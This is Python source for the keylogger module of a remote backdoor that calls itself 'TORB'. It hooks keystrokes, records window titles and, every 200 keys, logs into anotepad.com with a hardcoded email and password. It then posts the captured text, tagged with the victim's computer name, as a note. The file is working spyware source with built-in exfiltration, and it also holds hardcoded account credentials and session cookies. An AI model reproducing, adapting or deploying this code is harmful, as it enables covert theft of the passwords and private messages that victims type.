
#  _______  _______  ______    _______        ___   __   __ 
# |       ||       ||    _ |  |  _    |      |   | |  | |  |
# |_     _||   _   ||   | ||  | |_|   |      |   | |  |_|  |
#   |   |  |  | |  ||   |_||_ |       |      |   | |       |
#   |   |  |  |_|  ||    __  ||  _   |       |   | |       |
#   |   |  |       ||   |  | || |_|   |      |   |  |     | 
#   |___|  |_______||___|  |_||_______|      |___|   |___|  
#                     
# Twitter Operated Remote Backdoor
# Version 4.0

# [ RCI Module - Remote Code Injection ]

#  ___                                           ___ 
# |  _|   _____         _                       |_  |
# | |    |  |  |___ _ _| |___ ___ ___ ___ ___     | |
# | |    |    -| -_| | | | . | . | . | -_|  _|    | |
# | |_   |__|__|___|_  |_|___|_  |_  |___|_|     _| |
# |___|            |___|     |___|___|          |___|

# Description: This module monitors keystrokes and then delivers them.
# Type: This module was designed for TORB IV (Personal Remote Operated Backdoor Executable).

import requests
import ctypes
from ctypes import *
import os
import pyHook, pythoncom, sys, logging
import random
import shutil

# Config
cntrlPanel = 'http://twitter.com/pyprototype2'
anotepadUser = 'pyhannahmaple@gmail.com'
anotepadPass = 'hc4BXdNgAv3UwKQD'

# Global Variables
pushKeys = ""
OSFingerprint = os.environ['COMPUTERNAME']

# Log List [Keylog]
grab = []

# Access DLLs [Keylog]
user32 = windll.user32
kernel32 = windll.kernel32
winTitle = None

# Function: aNotepad.com Submission
def asubmit(subjNote):

	global login_URL
	global page
	global landing
	global keyword

	comm_append = ''

	for comm_i in subjNote:
		comm_append = comm_append + comm_i

	login_URL = 'https://anotepad.com/create_account'
	landing = 'https://anotepad.com/'
	keyword = 'Logout'

	note_title = "module.keylogger"
	note_description = comm_append
	creationLink = 'https://anotepad.com/note/create'

	print subjNote

	with requests.Session() as c:
	
		login_data = \
		{
			'action': 'login',
			'email': anotepadUser,
			'password': anotepadPass,
			'submit':'' 
		}

		create_form = \
		{
			'notetype': 'PlainText',
			'noteaccess': '1',
			'notepassword':'',
			'notequickedit': 'false',
			'notequickeditpassword':'', 
			'notetitle': note_title,
			'notecontent': note_description
		}

		header_data = \
		{
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate, br',
			'Accept-Language': 'en-US,en;q=0.9',
			'Cache-Control': 'max-age=0',
			'Connection': 'keep-alive',
			'Content-Length': '73',
			'Content-Type': 'application/x-www-form-urlencoded',
			'Cookie': 'ASP.NET_SessionId=rku3vcoj1s5nydlicq20ww1t; _ga=GA1.2.1863299564.1520884326; _gid=GA1.2.2075336709.1520884326; uvts=7F3tp9k4KUrGKngS; _gat=1; __atuvc=7%7C11; __atuvs=5aa6da6b2e4908e9006',
			'Host': 'anotepad.com',
			'Origin': 'https://anotepad.com',
			'Referer': 'https://anotepad.com/create_account',
			'Upgrade-Insecure-Requests': '1',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36'
		}

		header_create = \
		{
			'Accept': '*/*',
			'Accept-Encoding': 'gzip, deflate, br',
			'Accept-Language': 'en-US,en;q=0.9',
			'Connection': 'keep-alive',
			'Content-Length': '172',
			'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Cookie': 'ASP.NET_SessionId=rku3vcoj1s5nydlicq20ww1t; _ga=GA1.2.1863299564.1520884326; _gid=GA1.2.2075336709.1520884326; uvts=7F3tp9k4KUrGKngS; Anotepad=645503E71D3DEB85AF8F469D7A8227A738E907F75816F05B37A18CFF114F39E92911FCFD29D898D34D4AD800E30F703B4E7460AF5FF83767A4D6F63DE0DE2D59444CB25286F7CE7534815FA04973D2F3C81749DB58EFEDE0BC7A1FD2D3FF6E1FE81665BF6CE882BDA6B10B929BF6F044; _gat=1; __atuvc=41%7C11; __atuvs=5aa6da6b2e4908e9028',
			'Host': 'anotepad.com',
			'Origin': 'https://anotepad.com',
			'Referer': 'https://anotepad.com/',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36',
			'X-Requested-With': 'XMLHttpRequest'
		}

		c.get(login_URL)
		c.post(login_URL, data=login_data, headers=header_data)

		asubmit.page = c.get(landing)
		Check = asubmit.page.content.find(keyword)

		if Check == -1:
			print '\nlogin failed. (Try again)'
		else:
			print '\nSuccessful login + submission'

		c.post(creationLink, data=create_form, headers=header_create)

# Function: Keyboard Input Monitor
def OnKeyboardEvent(event):
	global winTitle
	global hooks_manager
	global pushKeys
	global OSFingerprint
	global q

	if event.WindowName != winTitle:
		winTitle = event.WindowName
		getWindowTitle()

	print chr(event.Ascii)
	grab.append(chr(event.Ascii))

	if len(grab) >= 200:
		print '\nSubmitting keys...'
		for keyCon in grab:
			pushKeys = pushKeys + keyCon

		pushKeys = pushKeys.replace("'", '')

		asubmit("[%s] - %s" % (OSFingerprint, pushKeys))
		del grab[:]
		hooks_manager.UnhookKeyboard()
		ctypes.windll.user32.PostQuitMessage(0)

	else:
		pass

	return True

# Function: Window Title Capture
def getWindowTitle():
	hwnd = user32.GetForegroundWindow()

	title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(hwnd, byref(title),512)

	print "\n\n[ %s ]\n\n" % ( title.value)
	grab.append("\n\n[ " + title.value + " ]\n\n")

	kernel32.CloseHandle(hwnd)
	return True


def start():
	global hooks_manager
	global pyHook
	global OnKeyboardEvent
	global pythoncom
	global getWindowTitle
	global grab
	global user32
	global kernel32

	try:
		hooks_manager = pyHook.HookManager()
		hooks_manager.KeyDown = OnKeyboardEvent
		hooks_manager.HookKeyboard()
		pythoncom.PumpMessages()
	except:
		asubmit("[%s] - Keylogger activation failed." % (OSFingerprint))

start()